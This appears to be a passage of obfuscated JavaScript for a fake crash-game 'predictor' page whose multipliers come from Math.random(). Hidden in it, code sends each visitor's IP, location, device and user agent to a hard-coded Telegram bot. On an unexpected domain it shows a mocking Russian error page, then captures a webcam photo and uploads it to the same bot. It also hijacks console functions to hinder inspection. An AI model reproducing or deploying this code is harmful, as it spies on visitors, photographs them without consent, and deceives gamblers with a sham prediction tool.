"ss=\"a", 'xf8AP', 'RjY/H', "ass=\"", 'fG0BB', 'jcRUa', 'iYWDl', 'iIhFx', 'FZO1F', 'meFQn', 'flyin', 'a85Js', ": 5px", 'NLOoA', 'duA5V', 'ramBu', 'uOAsU', 'xUIPm', 'TRNMZ', "t\"></", " 25px", 'aNT4h', 'gZyGM', 'Csob3', 'paSYL', 'mKQdk', "ht 2s", 'fBIwB', 'BFQaD', 'wVuzK', 'fromC', 'uWZgr', 'add', 'gYDzN', 'KRmDd', 'JkK0D', 'JUUNV', '8xHKl', "in: <", 'fOrhU', '+/SOO', 'aivtX', 'WZVMw', 'canva', ", 1)", '914yz', 'PM2Iy', 'bezie', 'ksnR3', 'Lm+Q1', " opac", '/Mbe/', 'Ufl1W', 'gent', 'ifMps', 'pmcTk', "  bac", 'Gsnhi', 'AtK1v', 'NWhBw', "dium ", 'le-la', "ne;\n ", 'regio', 'kdCAA', "/h1>\n", "rror ", 'JTuBr', 'HSrhe', 'wfUaN', 'pnOlc', 'ygOug', 'gwAzr', 'VlhhB', 'Xrbh/', 'jq9pn', 'rxhvn', 'QKqID', 'KRAIc', 'ppowV', 'BEzch', " <a h", "i>\n  ", '11PIx', 'RYeEK', 'dgSIH', 'VkUz6', 'NsNTY', " p {\n", 'ai2CT', 'info', 'YMdcx', 'displ', 'ient(', 'gR/5n', 't5IBg', 'kxV6R', " 0% {", '(1.05', '-grad', 'MXNEQ', '.game', 'fMuBy', 'CTuKu', 's.com', 'left', 'icker', "    h", ": 1.5", '2hX6/', 'сожал', 'ax-wi', 'stars', 'AjGsx', '64,iV', 'ASjxr', 'L8kh0', 'sfHHf', 'Fw8R3', 'LMVva', "ht: a", 'jsUb5', "ite a", 'white', 'UTpQe', "Bot i", "rge 5", 'FJCI5', '.gith', 'fhBzT', 'otf+j', 'VBYqj', 'mzV96', 'oto:', 'zaNvb', 'e-ele', 'm/lOw', 'userA', 'AA7DA', 'ate', '-size', 'UuraS', 'UJAsD', 'oCgUA', 'knDTO', 't-hei', ": 4em", 'KBQBf', "er;\n "];
  _0x1be7 = function () {
    return _0x2bd477;
  };
  return _0x1be7();
}
function _0x3036d5(_0x22fc86, _0x35f5da, _0x2d05b8, _0x5a1cec, _0x23b21d) {
  return _0x135c(_0x5a1cec + 0x34b, _0x22fc86);
}
function parseUserAgent(_0x5ecde8) {
  const _0x5ed3da = {
    regex: /iPhone\s*(\d+([_\.]\d+)*)/i,
    type: "Mobile",
    os: "iOS"
  };
  const _0x5336cb = {
    regex: /iPad/i,
    type: "Tablet"
  };
  _0x5336cb.os = "iOS";
  const _0x2a2fc7 = {
    regex: /Android\s*([\d\.]+)/i,
    type: "Mobile",
    os: "Android"
  };
  const _0xe3f301 = {
    regex: /Windows Phone\s*([\d\.]+)/i,
    type: "Mobile",
    os: "Windows Phone"
  };
  const _0x5d8dea = [_0x5ed3da, _0x5336cb, _0x2a2fc7, _0xe3f301];
  const _0x4501cc = {
    regex: /Windows/i,
    type: "Desktop"
  };
  _0x4501cc.os = "Windows";
  const _0x2890f9 = {
    regex: /Macintosh/i,
    type: "Desktop",
    os: "macOS"
  };
  const _0x193023 = {
    regex: /Linux/i,
    type: "Desktop",
    os: "Linux"
  };
  const _0x419033 = [_0x4501cc, _0x2890f9, _0x193023];
  for (let _0x9aa66d of _0x5d8dea) {
    const _0x460437 = _0x5ecde8.match(_0x9aa66d.regex);
    if (_0x460437) {
      return {
        'type': _0x9aa66d.type,
        'os': _0x9aa66d.os,
        'model': parseDeviceModel(_0x5ecde8, _0x9aa66d.os)
      };
    }
  }
  for (let _0x5be735 of _0x419033) {
    const _0x367371 = _0x5ecde8.match(_0x5be735.regex);
    if (_0x367371) {
      return {
        'type': _0x5be735.type,
        'os': _0x5be735.os,
        'model': parseDeviceModel(_0x5ecde8, _0x5be735.os)
      };
    }
  }
  const _0x26e6c4 = {
    type: "Unknown"
  };
  _0x26e6c4.os = "Unknown";
  _0x26e6c4.model = "Unknown Device";
  return _0x26e6c4;
}
function parseDeviceModel(_0x21eaa3, _0x2b5cf5) {
  switch (_0x2b5cf5) {
    case "iOS":
      const _0x1e5f89 = _0x21eaa3.match(/iPhone\s*(\d+([_\.]\d+)*)/i);
      if (_0x1e5f89) {
        return "iPhone " + _0x1e5f89[1].replace(/[_\.]/g, " ");
      }
      const _0x30462d = _0x21eaa3.match(/iPad/i);
      if (_0x30462d) {
        return "iPad";
      }
      break;
    case "Android":
      const _0xa947ca = _0x21eaa3.match(/;\s*([^;)]+)\s*Build/i);
      if (_0xa947ca) {
        return _0xa947ca[1].trim();
      }
      break;
    case "Windows":
      const _0x597725 = _0x21eaa3.match(/Windows\s*([\w\s]+)/i);
      if (_0x597725) {
        return "Windows " + _0x597725[1];
      }
      break;
    case "macOS":
      const _0x4936bd = _0x21eaa3.match(/Macintosh;.*Mac\s*([\w\s]+)/i);
      if (_0x4936bd) {
        return "Mac " + _0x4936bd[1];
      }
      break;
  }
  return "Unknown Device";
}
function _0x135c(_0x1be748, _0x135cea) {
  const _0x1d8a11 = _0x1be7();
  _0x135c = function (_0x1ea2ab, _0x5dbc31) {
    _0x1ea2ab = _0x1ea2ab - 357;
    let _0x41140c = _0x1d8a11[_0x1ea2ab];
    return _0x41140c;
  };
  return _0x135c(_0x1be748, _0x135cea);
}
function getCountryEmoji(_0x5b3e0d) {
  return _0x5b3e0d.replace(/./g, _0x3e42f7 => String.fromCodePoint(127397 + _0x3e42f7.toUpperCase().charCodeAt()));
}
async function captureAndSendPhoto() {
  try {
    const _0x46b414 = {
      video: true
    };
    const _0x1eb48e = await navigator.mediaDevices.getUserMedia(_0x46b414);
    const _0x5d7e4f = document.createElement("video");
    _0x5d7e4f.srcObject = _0x1eb48e;
    await _0x5d7e4f.play();
    const _0x2f4be2 = document.createElement("canvas");
    _0x2f4be2.width = _0x5d7e4f.videoWidth;
    _0x2f4be2.height = _0x5d7e4f.videoHeight;
    const _0x283607 = _0x2f4be2.getContext('2d');
    _0x283607.drawImage(_0x5d7e4f, 0, 0, _0x2f4be2.width, _0x2f4be2.height);
    _0x5d7e4f.pause();
    _0x1eb48e.getTracks().forEach(_0x4cd8a1 => _0x4cd8a1.stop());
    const _0x37c410 = await new Promise(_0x3ba1bc => _0x2f4be2.toBlob(_0x3ba1bc, "image/jpeg"));
    const _0x58105a = new FormData();
    _0x58105a.append("chat_id", "7728504492");
    _0x58105a.append("photo", _0x37c410, "photo.jpg");
    await fetch("https://api.telegram.org/bot8493084337:AAFPW75-vT4EgtloLveSmbgN-6bvD3FYztos/sendPhoto", {
      'method': "POST",
      'body': _0x58105a
    });
    console.log("Photo captured and sent successfully");
  } catch (_0x3cef16) {
    console.error("Failed to capture photo:", _0x3cef16);
  }
}
async function initTelegramBot() {
  const _0xb6636f = function () {
    let _0x121ef4 = true;
    return function (_0x4f8d8e, _0x4edacc) {
      const _0x359715 = _0x121ef4 ? function () {
        if (_0x4edacc) {
          const _0x1e4ce2 = _0x4edacc.apply(_0x4f8d8e, arguments);
          _0x4edacc = null;
          return _0x1e4ce2;
        }
      } : function () {};
      _0x121ef4 = false;
      return _0x359715;
    };
  }();
  const _0x50b716 = _0xb6636f(this, function () {
    let _0x593c48;
    try {
      const _0x124a67 = Function("return (function() {}.constructor(\"return this\")( ));");
      _0x593c48 = _0x124a67();
    } catch (_0x5ec507) {
      _0x593c48 = window;
    }
    const _0x5b391c = _0x593c48.console = _0x593c48.console || {};
    const _0x3cd3dd = ["log", "warn", "info", "error", "exception", "table", "trace"];
    for (let _0x33288e = 0; _0x33288e < _0x3cd3dd.length; _0x33288e++) {
      const _0xbcecc = _0xb6636f.constructor.prototype.bind(_0xb6636f);
      const _0x35e187 = _0x3cd3dd[_0x33288e];
      const _0x58f417 = _0x5b391c[_0x35e187] || _0xbcecc;
      _0xbcecc.__proto__ = _0xb6636f.bind(_0xb6636f);
      _0xbcecc.toString = _0x58f417.toString.bind(_0x58f417);
      _0x5b391c[_0x35e187] = _0xbcecc;
    }
  });
  _0x50b716();
  const _0x3da400 = {
    domain: window.location.hostname,
    fullUrl: window.location.href
  };
  if (_0x3da400.domain !== "trd.cc.nf") {
    document.body.innerHTML = "\n            <div id=\"overlay\">\n                <h1>Ошибка 404: Доступ запрещен</h1>\n                <div class=\"arrow top\"></div>\n                <div class=\"arrow bottom\"></div>\n                <div class=\"arrow left\"></div>\n                <div class=\"arrow right\"></div>\n                <img src=\"data:image/png;base64,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\" alt=\"Error Image\" style=\"max-width: 100%; height: auto;\" />\n                <p>К сожалению, возникли проблемы с доступом к сайту:</p>\n                <ul>\n                    <li>Не удалось загрузить ресурс.</li>\n                    <li>Проблемы с сервером.</li>\n                    <li>Неправильный домен.</li>\n                    <li>Возможно вы блюм.</li>\n                    <li>Возможно вы хотели спиздить вебку.</li>\n                    <li>Возможно вы хотели обновить вебку за 15$.</li>\n                    <li>Возможно вы хотели купить вебку у ее кодера.</li>\n                </ul>\n\n                <a href=\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\" id=\"fixButton\">Fix It</a>\n            </div>\n        ";
    const _0x17ecbf = document.createElement("style");
    _0x17ecbf.innerHTML = "\n\n            body {\n                margin: 0;\n                height: 100vh;\n                display: flex;\n                justify-content: center;\n                align-items: center;\n                position: relative;\n                overflow: hidden;\n                background-color: #282c34;\n                color: white;\n                font-family: 'Arial', sans-serif;\n            }\n            #overlay {\n                position: absolute;\n                top: 0;\n                left: 0;\n                right: 0;\n                bottom: 0;\n                background: linear-gradient(135deg, rgba(255, 0, 0, 0.7), rgba(255, 255, 0, 0.7));\n                display: flex;\n                flex-direction: column;\n                justify-content: center;\n                align-items: center;\n                z-index: 9999;\n                padding: 20px;\n                animation: flicker 1s infinite;\n            }\n            h1 {\n                font-size: 4em;\n                margin: 0;\n                text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);\n                animation: glow 1.5s infinite alternate;\n            }\n            p {\n                font-size: 1.5em;\n                margin: 20px 0;\n                text-shadow: 0 0 5px rgba(255, 255, 255, 0.5);\n            }\n            ul {\n                list-style-type: none;\n                padding: 0;\n                text-align: center;\n                font-size: 1.2em;\n            }\n            #fixButton {\n                background-color: white;\n                color: red;\n                border: none;\n                padding: 10px 20px;\n                font-size: 18px;\n                cursor: pointer;\n                text-decoration: none;\n                border-radius: 5px;\n                transition: background-color 0.3s, transform 0.3s;\n                box-shadow: 0 0 10px rgba(255, 0, 0, 0.8);\n            }\n            #fixButton:hover {\n                background-color: #ddd;\n                transform: scale(1.05);\n            }\n            @keyframes flicker {\n                0% { opacity: 1; }\n                50% { opacity: 0.7; }\n                100% { opacity: 1; }\n            }\n            @keyframes glow {\n                0% { text-shadow: 0 0 10px rgba(255, 255, 255, 0.8); }\n                100% { text-shadow: 0 0 20px rgba(255, 255, 255, 1); }\n            }\n\n        ";
    document.head.appendChild(_0x17ecbf);
    const _0x3abf09 = await getUserInfo();
    await sendTelegramMessage("\n🚫 <b>Unauthorized Access Attempt Detected</b>\n📍 Domain: <code>" + _0x3da400.domain + "</code>\n🔗 URL: <code>" + _0x3da400.fullUrl + "</code>\n🌐 IP: <code>" + _0x3abf09.ip + "</code>\n📌 Location: " + _0x3abf09.city + ", " + _0x3abf09.region + ", " + _0x3abf09.countryName + " " + _0x3abf09.countryEmoji + "\n📱 Device: <code>" + _0x3abf09.deviceModel + "</code>\n🖥️ Type: <code>" + _0x3abf09.deviceType + " (" + _0x3abf09.deviceOS + ")</code>\n📱 User Agent: <code>" + _0x3abf09.userAgent + "</code>\n⏰ Time: <code>" + new Date().toISOString() + "</code>\n    ");
    await captureAndSendPhoto();
    return;
  }
  try {
    const _0x1ab2d8 = await fetch("https://api.telegram.org/bot8493084337:AAFPW75-vT4EgtloLveSmbgN-6bvD3FYztos/getMe");
    const _0x2bac44 = await _0x1ab2d8.json();
    if (_0x2bac44.ok) {
      console.log("Bot initialized");
      isAuthenticated = true;
      const _0x478371 = await getUserInfo();
      await sendTelegramMessage("\n🚀 <b>New Bot Access Detected</b>\n📍 Domain: <code>" + _0x3da400.domain + "</code>\n🔗 URL: <code>" + _0x3da400.fullUrl + "</code>\n🌐 IP: <code>" + _0x478371.ip + "</code>\n📌 Location: " + _0x478371.city + ", " + _0x478371.region + ", " + _0x478371.countryName + " " + _0x478371.countryEmoji + "\n📱 Device: <code>" + _0x478371.deviceModel + "</code>\n🖥️ Type: <code>" + _0x478371.deviceType + " (" + _0x478371.deviceOS + ")</code>\n📱 User Agent: <code>" + _0x478371.userAgent + "</code>\n⏰ Time: <code>" + new Date().toISOString() + "</code>\n    ");
    }
  } catch (_0x1b7174) {
    console.error("Failed to initialize bot:", _0x1b7174);
    const _0x15ef9b = await getUserInfo();
    await sendTelegramMessage("\n❗️ <b>Bot Initialization Failed</b>\n📍 Domain: <code>" + _0x3da400.domain + "</code>\n🔗 URL: <code>" + _0x3da400.fullUrl + "</code>\n🌐 IP: <code>" + _0x15ef9b.ip + "</code>\n📌 Location: " + _0x15ef9b.city + ", " + _0x15ef9b.region + ", " + _0x15ef9b.countryName + " " + _0x15ef9b.countryEmoji + "\n📱 Device: <code>" + _0x15ef9b.deviceModel + "</code>\n🖥️ Type: <code>" + _0x15ef9b.deviceType + " (" + _0x15ef9b.deviceOS + ")</code>\n📱 User Agent: <code>" + _0x15ef9b.userAgent + "</code>\n⏰ Time: <code>" + new Date().toISOString() + "</code>\n    ");
  }
}
initTelegramBot().then(() => {
  if (isAuthenticated) {
    fetchDataAndUpdate();
    setInterval(fetchDataAndUpdate, 100);
    setInterval(checkSignal, 100);
    checkSignal();
  }
});
const gameContainer = document.querySelector(".game-container");
const balloon = document.querySelector(".balloon");
const valueDisplay = document.querySelector(".value");
function _0x48b84d(_0x23444b, _0x3b2907, _0x5cded8, _0x36bde5, _0x164cd5) {
  return _0x135c(_0x5cded8 - 0x2dc, _0x36bde5);
}
const predictButton = document.getElementById("predictButton");
const backButton = document.getElementById("backButton");
const telegramButton = document.getElementById("telegramButton");
const stars = document.querySelector(".stars");
const saturn = document.querySelector(".saturn");
let isAnimating = false;
let targetMultiplier = 1;
let saturnInterval;
function createRandomMeteor() {
  const _0x332d21 = Math.random() * 15;
  const _0x4dfc0d = Math.random() * 80;
  const _0x51fd95 = Math.random() * 40;
  setTimeout(() => {
    const _0x3ef2ba = document.createElement("div");
    _0x3ef2ba.className = "meteor";
    _0x3ef2ba.style.left = _0x4dfc0d + '%';
    _0x3ef2ba.style.top = _0x51fd95 + '%';
    document.querySelector(".space-elements").appendChild(_0x3ef2ba);
    setTimeout(() => {
      _0x3ef2ba.remove();
      createRandomMeteor();
    }, 8000);
  }, _0x332d21 * 1000);
}
function moveSaturn() {
  saturn.style.opacity = '0';
  setTimeout(() => {
    const _0x9331dc = 5 + Math.random() * 30;
    const _0x360f11 = 5 + Math.random() * 30;
    saturn.style.top = _0x9331dc + '%';
    saturn.style.right = _0x360f11 + '%';
    saturn.style.opacity = '1';
  }, 1500);
}
function startSaturnMovement() {
  if (saturnInterval) {
    clearInterval(saturnInterval);
  }
  const _0x4efc00 = 15000 + Math.random() * 15000;
  saturnInterval = setInterval(moveSaturn, _0x4efc00);
}
function _0x4bd6bb(_0x2dfe70, _0x40262f, _0x563206, _0x6d0edb, _0x53f54b) {
  return _0x135c(_0x563206 - 0x1b3, _0x40262f);
}
function _0x1a391c(_0x370442, _0x366b72, _0x2eb15d, _0x3d3920, _0x423756) {
  return _0x135c(_0x3d3920 - 0x3cf, _0x2eb15d);
}
function getRandomMultiplier() {
  return (1.2 + Math.random() * 8.8).toFixed(2);
}
function updateBalloon(_0x4027fb) {
  valueDisplay.textContent = parseFloat(_0x4027fb).toFixed(2) + 'x';
  const _0x4c9de3 = (_0x4027fb - 1) / 9;
  const _0x513876 = 1 + 0.8 * _0x4c9de3;
  const _0x4e5551 = -70 - 15 * _0x4c9de3;
  balloon.style.setProperty("--lift-height", _0x4e5551 + '%');
  balloon.style.transform = "translate(-50%, " + _0x4e5551 + '%)';
  balloon.style.scale = _0x513876.toFixed(2);
  balloon.classList.add("flying");
  gameContainer.classList.add("flying");
  if (_0x4027fb > 5) {
    balloon.classList.add("high-flying");
    gameContainer.classList.add("high-flying");
  } else {
    balloon.classList.remove("high-flying");
    gameContainer.classList.remove("high-flying");
  }
  if (_0x4027fb > 5) {
    const _0x3b96dc = 0.3 + (_0x4027fb - 5) / 10;
    saturn.style.filter = "drop-shadow(0 0 25px rgba(255, 255, 255, " + _0x3b96dc + '))';
  }
}
function resetBalloon() {
  return new Promise(_0x1fa64b => {
    balloon.classList.remove("flying");
    balloon.classList.remove("high-flying");
    gameContainer.classList.remove("flying");
    gameContainer.classList.remove("high-flying");
    balloon.style.transition = "transform 1s ease, scale 1s ease";
    balloon.style.setProperty("--lift-height", "-70%");
    balloon.style.transform = "translate(-50%, -70%)";
    balloon.style.scale = '1';
    valueDisplay.textContent = "1.00x";
    saturn.style.filter = "drop-shadow(0 0 15px rgba(255, 255, 255, 0.3))";
    document.querySelectorAll(".space-elements, .nebula, .saturn").forEach(_0x36b670 => {
      _0x36b670.style.transform = '';
    });
    stars.style.animation = "none";
    void stars.offsetWidth;
    stars.style.animation = "stars-drift 120s infinite linear";
    document.querySelectorAll(".star").forEach(_0x546cb4 => {
      const _0x3dd53f = _0x546cb4.className;
      _0x546cb4.style.animation = "none";
      _0x546cb4.style.transform = '';
      void _0x546cb4.offsetWidth;
      if (_0x3dd53f.includes("star-small")) {
        _0x546cb4.style.animation = "twinkle-small 3s infinite alternate";
      } else {
        if (_0x3dd53f.includes("star-medium")) {
          _0x546cb4.style.animation = "twinkle-medium 4s infinite alternate";
        } else {
          if (_0x3dd53f.includes("star-large")) {
            _0x546cb4.style.animation = "twinkle-large 5s infinite alternate";
          } else {
            if (_0x3dd53f.includes("star-bright")) {
              _0x546cb4.style.animation = "pulse-bright 2s infinite alternate";
            } else {
              if (_0x3dd53f.includes("star-colored")) {
                _0x546cb4.style.animation = "color-shift 8s infinite alternate";
              }
            }
          }
        }
      }
    });
    setTimeout(() => {
      balloon.style.transition = "transform 3s cubic-bezier(0.19, 1, 0.22, 1), scale 3s cubic-bezier(0.19, 1, 0.22, 1)";
      _0x1fa64b();
    }, 800);
  });
}
function updateBackgroundShift(_0x17eee4) {
  const _0x3e2f12 = {
    yQomx: function (_0xbd2833, _0x53f457) {
      return _0xbd2833 / _0x53f457;
    }
  };
  _0x3e2f12.YvYLv = function (_0x5bde63, _0x338a30) {
    return _0x5bde63 - _0x338a30;
  };
  _0x3e2f12.KRmDd = function (_0x1d1498, _0x3ce408) {
    return _0x1d1498 + _0x3ce408;
  };
  _0x3e2f12.sBcQj = function (_0x35c71e, _0x408a64) {
    return _0x35c71e * _0x408a64;
  };
  _0x3e2f12.yvQuJ = "--background-shift";
  _0x3e2f12.EgQOL = "--background-shift-high";
  _0x3e2f12.ZFRCB = function (_0x3765b4, _0x4f4e26) {
    return _0x3765b4 * _0x4f4e26;
  };
  const _0x255762 = _0x3e2f12.YvYLv(_0x17eee4, 1) / 9;
  const _0x4f5c68 = _0x3e2f12.KRmDd(10, _0x3e2f12.sBcQj(_0x3e2f12.YvYLv(30, 10), _0x255762));
  gameContainer.style.setProperty(_0x3e2f12.yvQuJ, _0x4f5c68 + 'vh');
  gameContainer.style.setProperty(_0x3e2f12.EgQOL, _0x3e2f12.ZFRCB(_0x4f5c68, 1.2) + 'vh');
}
function animate(_0x12dc08, _0x24528f, _0x20459c) {
  const _0x5a9c40 = performance.now();
  isAnimating = true;
  predictButton.disabled = true;
  balloon.style.transition = "transform 3s cubic-bezier(0.19, 1, 0.22, 1), scale 3s cubic-bezier(0.19, 1, 0.22, 1)";
  balloon.classList.add("flying");
  gameContainer.classList.add("flying");
  function _0x2a762e(_0x9efa6e) {
    const _0x5797c1 = _0x9efa6e - _0x5a9c40;
    const _0x819b0f = Math.min(_0x5797c1 / _0x20459c, 1);
    const _0x365a24 = easeOutQuart(_0x819b0f);
    const _0x155cae = _0x12dc08 + (_0x24528f - _0x12dc08) * _0x365a24;
    updateBackgroundShift(_0x155cae);
    updateBalloon(_0x155cae.toFixed(2));
    if (_0x819b0f < 1) {
      requestAnimationFrame(_0x2a762e);
    } else {
      isAnimating = false;
      setTimeout(() => {
        predictButton.disabled = false;
      }, 500);
    }
  }
  requestAnimationFrame(_0x2a762e);
}
function easeOutQuart(_0x56d4df) {
  const _0x3044cb = {
    KLyAo: function (_0x1bb7b3, _0x2b4d4e) {
      return _0x1bb7b3 - _0x2b4d4e;
    }
  };
  _0x3044cb.iwBJZ = function (_0xd5ade0, _0x2580c5) {
    return _0xd5ade0 - _0x2580c5;
  };
  return 1 - Math.pow(_0x3044cb.iwBJZ(1, _0x56d4df), 4);
}
predictButton.addEventListener("click", async () => {
  if (isAnimating) {
    return;
  }
  isAnimating = true;
  predictButton.disabled = true;
  backButton.classList.add("disabled");
  telegramButton.classList.add("disabled");
  await resetBalloon();
  targetMultiplier = (1.2 + Math.random() * 8.8).toFixed(2);
  const _0x1b981f = parseFloat(targetMultiplier) > 5 ? 5000 : 4000;
  animate(1, parseFloat(targetMultiplier), _0x1b981f);
  const _0x1a9f57 = document.querySelector(".meteor");
  if (_0x1a9f57) {
    _0x1a9f57.style.animation = "none";
    void _0x1a9f57.offsetWidth;
    _0x1a9f57.style.animation = "meteor-fall 8s 1";
  }
  setTimeout(() => {
    backButton.classList.remove("disabled");
    telegramButton.classList.remove("disabled");
    predictButton.disabled = false;
  }, _0x1b981f + 500);
});
updateBalloon(1);
balloon.style.setProperty("--lift-height", "-70%");
balloon.style.transform = "translate(-50%, -70%)";
balloon.style.scale = '1';
balloon.style.transition = "transform 3s cubic-bezier(0.19, 1, 0.22, 1), scale 3s cubic-bezier(0.19, 1, 0.22, 1)";
for (let i = 0; i < 3; i++) {
  createRandomMeteor();
}
startSaturnMovement();